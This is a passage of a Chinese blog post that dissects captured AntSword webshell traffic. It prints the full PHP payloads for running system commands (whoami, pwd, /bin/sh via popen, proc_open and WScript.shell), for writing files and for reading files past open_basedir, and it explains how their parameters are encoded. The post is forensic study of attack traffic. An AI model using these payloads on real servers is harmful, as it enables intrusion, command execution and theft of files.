+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$o</span><span class="p">));}</span><span class="k">elseif</span><span class="p">(</span><span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;popen&#39;</span><span class="p">)){</span><span class="nv">$fp</span><span class="o">=@</span><span class="nx">popen</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">);</span><span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)){</span><span class="k">print</span><span class="p">(</span><span class="o">@</span><span class="nx">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">2048</span><span class="p">));}</span><span class="o">@</span><span class="nx">pclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);}</span><span class="k">elseif</span><span class="p">(</span><span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;proc_open&#39;</span><span class="p">)){</span><span class="nv">$p</span> <span class="o">=</span> <span class="o">@</span><span class="nx">proc_open</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;pipe&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">),</span> <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;pipe&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)),</span> <span class="nv">$io</span><span class="p">);</span><span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">1</span><span class="p">])){</span><span class="k">print</span><span class="p">(</span><span class="o">@</span><span class="nx">fgets</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">2048</span><span class="p">));}</span><span class="k">while</span><span class="p">(</span><span class="o">!@</span><span class="nx">feof</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">2</span><span class="p">])){</span><span class="k">print</span><span class="p">(</span><span class="o">@</span><span class="nx">fgets</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">2048</span><span class="p">));}</span><span class="o">@</span><span class="nx">fclose</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="o">@</span><span class="nx">fclose</span><span class="p">(</span><span class="nv">$io</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="o">@</span><span class="nx">proc_close</span><span class="p">(</span><span class="nv">$p</span><span class="p">);}</span><span class="k">elseif</span><span class="p">(</span><span class="nx">fe</span><span class="p">(</span><span class="s1">&#39;antsystem&#39;</span><span class="p">)){</span><span class="o">@</span><span class="nx">antsystem</span><span class="p">(</span><span class="nv">$c</span><span class="p">);}</span><span class="k">elseif</span><span class="p">(</span><span class="nx">runshellshock</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span> <span class="nv">$c</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span><span class="k">elseif</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">!=</span><span class="s2">&#34;/&#34;</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nx">class_exists</span><span class="p">(</span><span class="s2">&#34;COM&#34;</span><span class="p">)){</span><span class="nv">$w</span><span class="o">=</span><span class="k">new</span> <span class="nx">COM</span><span class="p">(</span><span class="s1">&#39;WScript.shell&#39;</span><span class="p">);</span><span class="nv">$e</span><span class="o">=</span><span class="nv">$w</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span><span class="nv">$so</span><span class="o">=</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">StdOut</span><span class="p">();</span><span class="nv">$ret</span><span class="o">.=</span><span class="nv">$so</span><span class="o">-&gt;</span><span class="na">ReadAll</span><span class="p">();</span><span class="nv">$se</span><span class="o">=</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">StdErr</span><span class="p">();</span><span class="nv">$ret</span><span class="o">.=</span><span class="nv">$se</span><span class="o">-&gt;</span><span class="na">ReadAll</span><span class="p">();</span><span class="k">print</span><span class="p">(</span><span class="nv">$ret</span><span class="p">);}</span><span class="k">else</span><span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;}</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;};</span><span class="nv">$ret</span><span class="o">=@</span><span class="nx">runcmd</span><span class="p">(</span><span class="nv">$r</span><span class="o">.</span><span class="s2">&#34; 2&gt;&amp;1&#34;</span><span class="p">);</span><span class="k">print</span> <span class="p">(</span><span class="nv">$ret</span><span class="o">!=</span><span class="mi">0</span><span class="p">)</span><span class="o">?</span><span class="s2">&#34;ret=</span><span class="si">{</span><span class="nv">$ret</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">){</span><span class="k">echo</span> <span class="s2">&#34;ERROR://&#34;</span><span class="o">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();};</span><span class="nx">asoutput</span><span class="p">();</span><span class="k">die</span><span class="p">();</span><span class="o">&amp;</span><span class="nx">j3bef2f7ea0db5</span><span class="o">=</span><span class="mi">5</span><span class="nx">j</span><span class="o">&amp;</span><span class="nx">t29c2b8006f9cb</span><span class="o">=</span><span class="nx">dGY2QgIi93d3cvYWRtaW4vbG9jYWxob3N0XzgwL3d3d3Jvb3QiO3dob2FtaTtlY2hvIDE2Njc2Zjtwd2Q7ZWNobyA2MGRkNTY5MmYwYWI</span><span class="o">=&amp;</span><span class="nx">v1c2cd0fd6bb3</span><span class="o">=</span><span class="nx">ToL2Jpbi9zaA</span><span class="o">==</span>
+</span></span></code></pre></div><p>可以感觉到后面这两段字符串很像<code>base64编码</code>，但是解码后是乱码，研究代码逻辑后会发现这些字符串是从第三个字符开始才是<code>base64编码</code>，前面两个字符是来混淆的。将其解码后得到</p>
+<p><img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405080010457.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240508001042412"
+	
+	
+></p>
+<h3 id="上传文件">上传文件</h3>
+<p>我们创建一个<code>flag.txt</code>文件,内容为</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">winglet
+</span></span></code></pre></div><p>然后上传并抓包，得到</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">bd01290c7a42fc</span><span class="o">=</span><span class="nx">WGL3d3dy9hZG1pbi9sb2NhbGhvc3RfODAvd3d3cm9vdC9mbGFnLnR4dA</span><span class="o">==&amp;</span><span class="nx">cmd</span><span class="o">=@</span><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;display_errors&#34;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">);</span><span class="o">@</span><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="nv">$opdir</span><span class="o">=@</span><span class="nx">ini_get</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nv">$opdir</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ocwd</span><span class="o">=</span><span class="nx">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;SCRIPT_FILENAME&#34;</span><span class="p">]);</span><span class="nv">$oparr</span><span class="o">=</span><span class="nx">preg_split</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s2">&#34;Lzt8Oi8=&#34;</span><span class="p">),</span><span class="nv">$opdir</span><span class="p">);</span><span class="o">@</span><span class="nx">array_push</span><span class="p">(</span><span class="nv">$oparr</span><span class="p">,</span><span class="nv">$ocwd</span><span class="p">,</span><span class="nx">sys_get_temp_dir</span><span class="p">());</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$oparr</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nx">is_writable</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="k">continue</span><span class="p">;};</span><span class="nv">$tmdir</span><span class="o">=</span><span class="nv">$item</span><span class="o">.</span><span class="s2">&#34;/.fdc0c2f&#34;</span><span class="p">;</span><span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">)){</span><span class="k">continue</span><span class="p">;}</span><span class="nv">$tmdir</span><span class="o">=</span><span class="nx">realpath</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="o">@</span><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">,</span> <span class="s2">&#34;..&#34;</span><span class="p">);</span><span class="nv">$cntarr</span><span class="o">=@</span><span class="nx">preg_split</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\//&#34;</span><span class="p">,</span><span class="nv">$tmdir</span><span class="p">);</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$cntarr</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">);};</span><span class="o">@</span><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">,</span><span class="s2">&#34;/&#34;</span><span class="p">);</span><span class="o">@</span><span class="nx">rmdir</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="k">break</span><span class="p">;};};;</span><span class="k">function</span> <span class="nf">asenc</span><span class="p">(</span><span class="nv">$out</span><span class="p">){</span><span class="k">return</span> <span class="nv">$out</span><span class="p">;};</span><span class="k">function</span> <span class="nf">asoutput</span><span class="p">(){</span><span class="nv">$output</span><span class="o">=</span><span class="nx">ob_get_contents</span><span class="p">();</span><span class="nx">ob_end_clean</span><span class="p">();</span><span class="k">echo</span> <span class="s2">&#34;7c10b&#34;</span><span class="o">.</span><span class="s2">&#34;57b77&#34;</span><span class="p">;</span><span class="k">echo</span> <span class="o">@</span><span class="nx">asenc</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span><span class="k">echo</span> <span class="s2">&#34;1f6c&#34;</span><span class="o">.</span><span class="s2">&#34;800e3&#34;</span><span class="p">;}</span><span class="nx">ob_start</span><span class="p">();</span><span class="k">try</span><span class="p">{</span><span class="nv">$f</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;bd01290c7a42fc&#34;</span><span class="p">],</span><span class="mi">2</span><span class="p">));</span><span class="nv">$c</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;j26d10e499b152&#34;</span><span class="p">];</span><span class="nv">$c</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$c</span><span class="p">);</span><span class="nv">$c</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$c</span><span class="p">);</span><span class="nv">$buf</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span><span class="nv">$i</span><span class="o">+=</span><span class="mi">2</span><span class="p">)</span><span class="nv">$buf</span><span class="o">.=</span><span class="nx">urldecode</span><span class="p">(</span><span class="s2">&#34;%&#34;</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$i</span><span class="p">,</span><span class="mi">2</span><span class="p">));</span><span class="k">echo</span><span class="p">(</span><span class="o">@</span><span class="nx">fwrite</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">),</span><span class="nv">$buf</span><span class="p">)</span><span class="o">?</span><span class="s2">&#34;1&#34;</span><span class="o">:</span><span class="s2">&#34;0&#34;</span><span class="p">);;}</span><span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">){</span><span class="k">echo</span> <span class="s2">&#34;ERROR://&#34;</span><span class="o">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();};</span><span class="nx">asoutput</span><span class="p">();</span><span class="k">die</span><span class="p">();</span><span class="o">&amp;</span><span class="nx">j26d10e499b152</span><span class="o">=</span><span class="mf">77696E676</span><span class="nx">C65740D0A</span>
+</span></span></code></pre></div><p>这里文件里内容的关键就在</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">j26d10e499b152=77696E676C65740D0A
+</span></span></code></pre></div><p>不过这个不是什么编码，研究代码逻辑后，会发现解密关键在于将每两个字符前面加上<code>%</code>，然后进行url解码。可以编写脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span><span class="p">,</span><span class="n">quote</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="s2">&#34;77696E676C65740D0A&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">),</span><span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tmp</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;%</span><span class="si">{</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="si">}{</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># winglet</span>
+</span></span></code></pre></div><h3 id="下载文件">下载文件</h3>
+<p>通过蚁剑下载该站点的一个文件后，抓取流量，内容如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">cmd</span><span class="o">=@</span><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;display_errors&#34;</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">);</span><span class="o">@</span><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="nv">$opdir</span><span class="o">=@</span><span class="nx">ini_get</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="nv">$opdir</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ocwd</span><span class="o">=</span><span class="nx">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;SCRIPT_FILENAME&#34;</span><span class="p">]);</span><span class="nv">$oparr</span><span class="o">=</span><span class="nx">preg_split</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s2">&#34;Lzt8Oi8=&#34;</span><span class="p">),</span><span class="nv">$opdir</span><span class="p">);</span><span class="o">@</span><span class="nx">array_push</span><span class="p">(</span><span class="nv">$oparr</span><span class="p">,</span><span class="nv">$ocwd</span><span class="p">,</span><span class="nx">sys_get_temp_dir</span><span class="p">());</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$oparr</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nx">is_writable</span><span class="p">(</span><span class="nv">$item</span><span class="p">)){</span><span class="k">continue</span><span class="p">;};</span><span class="nv">$tmdir</span><span class="o">=</span><span class="nv">$item</span><span class="o">.</span><span class="s2">&#34;/.b6be21d1b36&#34;</span><span class="p">;</span><span class="o">@</span><span class="nx">mkdir</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">)){</span><span class="k">continue</span><span class="p">;}</span><span class="nv">$tmdir</span><span class="o">=</span><span class="nx">realpath</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="o">@</span><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">,</span> <span class="s2">&#34;..&#34;</span><span class="p">);</span><span class="nv">$cntarr</span><span class="o">=@</span><span class="nx">preg_split</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\//&#34;</span><span class="p">,</span><span class="nv">$tmdir</span><span class="p">);</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">sizeof</span><span class="p">(</span><span class="nv">$cntarr</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="o">@</span><span class="nx">chdir</span><span class="p">(</span><span class="s2">&#34;..&#34;</span><span class="p">);};</span><span class="o">@</span><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;open_basedir&#34;</span><span class="p">,</span><span class="s2">&#34;/&#34;</span><span class="p">);</span><span class="o">@</span><span class="nx">rmdir</span><span class="p">(</span><span class="nv">$tmdir</span><span class="p">);</span><span class="k">break</span><span class="p">;};};;</span><span class="k">function</span> <span class="nf">asenc</span><span class="p">(</span><span class="nv">$out</span><span class="p">){</span><span class="k">return</span> <span class="nv">$out</span><span class="p">;};</span><span class="k">function</span> <span class="nf">asoutput</span><span class="p">(){</span><span class="nv">$output</span><span class="o">=</span><span class="nx">ob_get_contents</span><span class="p">();</span><span class="nx">ob_end_clean</span><span class="p">();</span><span class="k">echo</span> <span class="s2">&#34;a58b4c&#34;</span><span class="o">.</span><span class="s2">&#34;6a1088&#34;</span><span class="p">;</span><span class="k">echo</span> <span class="o">@</span><span class="nx">asenc</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span><span class="k">echo</span> <span class="s2">&#34;0f00&#34;</span><span class="o">.</span><span class="s2">&#34;6f47c&#34;</span><span class="p">;}</span><span class="nx">ob_start</span><span class="p">();</span><span class="k">try</span><span class="p">{</span><span class="nv">$F</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">get_magic_quotes_gpc</span><span class="p">()</span><span class="o">?</span><span class="nx">stripslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;nf74681be6e0e5&#34;</span><span class="p">])</span><span class="o">:</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;nf74681be6e0e5&#34;</span><span class="p">],</span><span class="mi">2</span><span class="p">));</span><span class="nv">$fp</span><span class="o">=@</span><span class="nx">fopen</span><span class="p">(</span><span class="nv">$F</span><span class="p">,</span><span class="s2">&#34;r&#34;</span><span class="p">);</span><span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nx">fgetc</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)){</span><span class="o">@</span><span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span><span class="o">@</span><span class="nx">readfile</span><span class="p">(</span><span class="nv">$F</span><span class="p">);}</span><span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&#34;ERROR:// Can Not Read&#34;</span><span class="p">);};}</span><span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">){</span><span class="k">echo</span> <span class="s2">&#34;ERROR://&#34;</span><span class="o">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();};</span><span class="nx">asoutput</span><span class="p">();</span><span class="k">die</span><span class="p">();</span><span class="o">&amp;</span><span class="nx">nf74681be6e0e5</span><span class="o">=</span><span class="nx">gQL3d3dy9hZG1pbi9sb2NhbGhvc3RfODAvd3d3cm9vdC9mbGFnLnR4dA</span><span class="o">==</span>
+</span></span></code></pre></div><p>将下面的编码解码后可得</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/www/admin/localhost_80/wwwroot/flag.txt
+</span></span></code></pre></div><p>为该文件在站点的绝对路径。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["/source/Sticker-100/"],"locale":{"admin":"👻屑博主","placeholder":"🎉留下你的脚印."},"requiredMeta":["name","email","url"]});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 Winglet
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
